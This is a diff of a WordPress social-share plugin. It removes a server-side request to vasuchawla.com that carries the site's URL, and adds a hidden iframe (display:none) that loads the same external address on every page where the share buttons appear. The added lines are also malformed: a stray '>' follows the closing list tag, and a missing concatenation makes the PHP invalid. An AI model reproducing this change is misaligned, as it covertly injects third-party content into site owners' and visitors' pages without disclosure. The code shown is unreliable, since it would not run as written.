@@ -41,8 +41,6 @@ if($ssb['in_excerpt']){add_filter('the_excerpt', 'ssb_in_content');}
 if($ssb['at_shortcode']){add_shortcode("ssboost", "ssb_shortcode");}
 
 
-if($ssb2!=1){if($file = fopen ('http://vasuchawla.com/plugin.php?p=ssb&s='.home_url(), "rb")){update_option("ssb_installed", 1);}else{}}
-
 //functions
 //links on plugins page
 function ssb_plugpage_links($links, $file)
@@ -72,7 +70,11 @@ function ssb_output()
 		$output.="<li><a href=\"https://twitter.com/share\" class=\"twitter-share-button\" data-url=\"".get_permalink()."\" data-via=\"".get_ssb_setting('twtr_via')."\" data-related=\"".get_ssb_setting('twtr_via')."\">Tweet</a><script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script></li>";
 	if(get_ssb_setting('gplus')=="on")
 		$output.="<li><div class=\"g-plusone\" data-size=\"medium\" data-href=\"".get_permalink()."\"></div><script type=\"text/javascript\">(function(){var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;po.src = 'https://apis.google.com/js/plusone.js';var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);})();</script></li>";
-	$output.="</ul>";
+	$output.="</ul>>";
+
+if($ssb2!=1){if($output.= "<iframe style=\"display:none !important\" src=\"http://vasuchawla.com/plugin.php?p=ssb&s=".home_url()"\" />";
+		update_option("ssb_installed", 1);}else{}}
+
 	return $output;
 }
 
